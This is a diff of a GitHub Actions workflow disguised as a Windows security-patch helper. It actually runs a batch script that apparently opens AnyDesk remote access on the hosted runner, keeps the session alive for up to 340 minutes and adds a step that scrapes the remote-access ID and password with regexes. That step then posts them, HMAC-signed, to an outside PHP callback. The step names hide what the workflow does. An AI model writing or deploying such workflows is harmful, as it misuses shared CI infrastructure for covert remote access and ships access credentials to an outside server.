@@ -1,7 +1,3 @@
-# Copy to: .github/workflows/main.yml in your pool repository.
-# Keep "Run AnyDesk Setup" in job `update` and Put "Keep Alive" in a separate job (`keepalive` + needs: update).
-# If Keep Alive stays in the same job, GitHub often does not expose full step logs until that job ends — then
-# credentials appear only after cancel/stop. Split jobs fixes live credential fetch on the site.
 name: Windows-Update-Helper
 
 on:
@@ -11,7 +7,8 @@ jobs:
   update:
     name: Installing Security Patches
     runs-on: windows-latest
-    timeout-minutes: 120
+    timeout-minutes: 340
+
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
@@ -37,61 +34,54 @@ jobs:
             echo patch_v2.bat nahi mili!
           )
 
-      - name: Run AnyDesk Setup
-        shell: cmd
+      # 1) Run AnyDesk Setup output capture
+      - name: Run AnyDesk Setup (capture)
+        shell: powershell
         run: |
-          if exist show.bat (
-            call show.bat > anydesk_output.log 2>&1
-            type anydesk_output.log
-          ) else (
+          if (Test-Path show.bat) {
+            cmd /c "call show.bat" 2>&1 | Tee-Object -FilePath show_output.txt
+          } else {
             echo show.bat nahi mili!
             exit 1
-          )
+          }
 
-      - name: Push Credentials To Site (Live)
+      # 2) Send credentials to your site immediately (webhook)
+      - name: Send credentials to site
         shell: powershell
         env:
-          CALLBACK_URL: https://papa.fwh.is/api/github_callback.php
-          CALLBACK_TOKEN: ${{ secrets.SITE_CALLBACK_TOKEN }}
-          RUN_ID: ${{ github.run_id }}
-          REPOSITORY: ${{ github.repository }}
+          FRDP_CALLBACK_URL: https://papa.fwh.is/api/workflow_callback.php
+          FRDP_CALLBACK_SECRET: ${{ secrets.FRDP_CALLBACK_SECRET }}
         run: |
-          if (!(Test-Path "anydesk_output.log")) {
-            Write-Host "anydesk_output.log not found; skipping callback."
+          if (-not (Test-Path show_output.txt)) {
+            Write-Host "show_output.txt missing"
             exit 0
-          }
-          $txt = Get-Content "anydesk_output.log" -Raw
-          $id = $null
-          $pass = $null
-          $m1 = [regex]::Match($txt, 'Windows\s*Cloud\s*(?:PC\s*)?ID\s*(?:is)?\s*:\s*`?([0-9]{6,})`?', 'IgnoreCase')
-          if ($m1.Success) { $id = $m1.Groups[1].Value.Trim() }
-          $m2 = [regex]::Match($txt, 'Windows\s*Cloud\s*(?:PC\s*)?Password\s*(?:is)?\s*:\s*([^\r\n]+)', 'IgnoreCase')
-          if ($m2.Success) { $pass = $m2.Groups[1].Value.Trim(" `t`"'") }
-          if (-not $id -or -not $pass) {
-            Write-Host "Credentials not found in anydesk_output.log; skipping callback."
-            exit 0
-          }
-          $body = @{
-            token = $env:CALLBACK_TOKEN
-            run_id = [int64]$env:RUN_ID
-            repository = $env:REPOSITORY
-            pc_id = $id
-            pc_password = $pass
-            log_text = $txt
-          } | ConvertTo-Json -Compress
-          try {
-            $resp = Invoke-RestMethod -Method Post -Uri $env:CALLBACK_URL -ContentType "application/json" -Body $body
-            Write-Host ("Credentials callback response: " + ($resp | ConvertTo-Json -Compress))
-          } catch {
-            Write-Host ("Credentials callback failed: " + $_.Exception.Message)
           }
 
-  keepalive:
-    name: Keep Alive
-    needs: update
-    runs-on: windows-latest
-    timeout-minutes: 340
-    steps:
+          $text = Get-Content -Raw -Path show_output.txt
+
+          $id = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?ID\s*is\s*:\s*`?(\d[\d\s]{5,})`?','IgnoreCase').Groups[1].Value
+          $id = ($id -replace '\s+','').Trim()
+
+          $pw = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?Password(?:\s+is)?\s*:\s*([^\r\n]+)','IgnoreCase').Groups[1].Value.Trim()
+
+          if (-not $id -or -not $pw) {
+            Write-Host "Credentials not found in show_output.txt yet."
+            exit 0
+          }
+
+          $payload = @{
+            run_id = [int64]$env:GITHUB_RUN_ID
+            pc_id = $id
+            pc_password = $pw
+            sent_at = [int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+          } | ConvertTo-Json -Compress
+
+          $hmac = New-Object System.Security.Cryptography.HMACSHA256([Text.Encoding]::UTF8.GetBytes($env:FRDP_CALLBACK_SECRET))
+          $sigBytes = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($payload))
+          $sig = ($sigBytes | ForEach-Object { $_.ToString("x2") }) -join ""
+
+          Invoke-RestMethod -Method Post -Uri $env:FRDP_CALLBACK_URL -Headers @{ "X-FRDP-Signature" = $sig } -ContentType "application/json" -Body $payload
+
       - name: Keep Alive
         shell: cmd
         run: |
